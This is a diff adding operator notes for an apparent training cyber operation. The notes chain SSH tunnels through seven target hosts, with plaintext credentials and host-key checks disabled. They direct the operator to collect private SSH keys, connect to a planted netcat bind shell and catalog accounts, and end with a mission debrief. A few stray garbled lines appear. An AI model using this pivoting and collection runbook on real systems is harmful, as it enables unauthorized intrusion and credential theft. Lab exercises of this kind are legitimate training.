@@ -1,0 +1,122 @@
+
+BELLIGERENTBADGER002
+2022-08-23
+>T1: 10.50.29.166
+->T2: 10.20.169.10
+-->T3: 10.20.169.239
+---> T4: 192.186.169.41 (PACCT)
+----> T5: 192.186.169.201
+----> T6: 192.186.169.202
+----> T7: 192.186.169.203
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166 // 10.20.169.33
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+
+Action: Perform SSH masquerade and maneuver to the next target.
+
+T2:
+Hostname: CHATSVR
+IP: 10.20.169.10
+OS: Windows v. unknown
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.10:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade and maneuver to the next target.
+
+
+T3:
+Hostname: Vyos2
+IP: 10.20.169.239
+OS: Vyos
+Creds: NOC_Admin#::AhmdLxu29D
+Last Known SSH Port: 52230
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.239:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+AhmdLxu29D
+Action: Perform SSH masquerade and maneuver to the next target.
+
+T4:
+Hostname: ADMIN2
+IP: 192.186.169.41
+OS: CentOS 7
+Creds: askar#::DaXedayLasarah
+Last Known SSH Port: Ask Analyst
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@PROCESS ACCOUNTING@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ssh -S /tmp/T3 bad -O forward -L 4444:192.186.169.41:33157
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Perform SSH masquerade. Conduct device ??survey?? Collect any files of interest to include private ssh keys (for your user# only). Maneuver to the next target.
+
+    Process Accounting Guidance Update: To minimize commands on target, analyst surveys and non-scp collection methods are not authorized on targets running process accounting.
+        
+COLLECTION:
+FILESIZE
+HASH
+COMMAND SCP only
+        
+        
+T5:
+Hostname: Unknown
+IP: 192.186.169.201
+OS: Linux v Unknown #####################UNEXPECTED############################
+Creds: N/A
+Last Known SSH Port: None
+ssh -S /tmp/T4 bad -O forward -L 5555:192.186.169.201:4474
+nc localhost 5555
+x
+Action: Perform netcat connection via port 447# (no leading zero). If successful, perform @@device survey. @@Confirm with analyst regarding bypassing specific survey commands with large outputs that may bog down the netcat connection. Catalog any user accounts, report results to the analyst, and record applicable login data in opnotes. Maneuver to next target.
+**Note: The processes on target “ncat -knvlp 447# -e /bin/sh” is your entry point and should not be treated as malware.
+
+sdfsadfksdjhfksj
+###########################################DISCONNECT before T6############################################3
+
+
+T6:  
+Hostname: Unknown
+IP: 192.186.169.202
+OS: Windows v Unknown #####################UNEXPECTED############################
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33715
+ssh -S /tmp/T4 bad -O forward -L 6666:192.186.169.202:33715
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@device survey. Catalog any user accounts, report results to the analyst, and record applicable login data in opnotes. Maneuver to the next target.
+
+
+123aqwsdasdfsfsdf
+###########################################DISCONNECT before T7############################################3
+
+
+
+T7:  
+Hostname: Unknown
+IP: 192.186.169.203
+OS: Windows v Unknown #####################UNEXPECTED############################
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33715
+ssh -S /tmp/T4 bad -O forward -L 7777:192.186.169.203:33715
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform a @@device survey. Catalog any user accounts, report results to the analyst, and record applicable login data in opnotes. Conclude operation.
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: BELLIGERENTBADGER02
+
+MC: mc2
+
+Analyst: analyst2
+
+Description: BELLIGERENTBADGER02 is a C-ISR mission profile. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we directed to T4. On T4, we found a process accounting service that prevented us from performing a device survey and collection. On T5, we utilized the netcat implant on T5 to catch a shell to T5. On T5, we did not do a device survey due to instability with the netcat shell. However, we were able to catalog user accounts. On T6, we found that the OS of this device was actually Linux. On T7, we performed a device survey and concluded operation. 
+Overall, the mission was successful. There were a lot of malwares installed in the target set. There were some hidden malwares that need to be investigated further. There was an odd mechanism on T6 that possibly pointed at a brootkit malware. However, there were no solid evidence that this malware was running via our give vetting commands. I recommend we come back and investigate this further. 
+
